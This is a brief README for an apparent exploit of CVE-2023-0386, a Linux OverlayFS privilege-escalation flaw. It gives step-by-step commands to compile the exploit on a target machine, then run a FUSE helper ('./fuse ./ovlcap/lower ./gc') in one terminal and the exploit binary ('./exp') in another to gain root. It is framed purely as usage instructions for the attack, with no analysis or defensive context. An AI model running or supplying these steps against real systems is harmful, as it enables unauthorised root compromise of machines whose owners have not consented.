### CVE-2023-0386 ###
 - how to use exploit and escalate our privilege to root.
 - compile the folder into target machine and run make.
```
make all
```
 - now run two terminals on the target and run this respectively.
 - run this on first terminal
```
./fuse ./ovlcap/lower ./gc
```
 - run this on second terminal
```
./exp
```
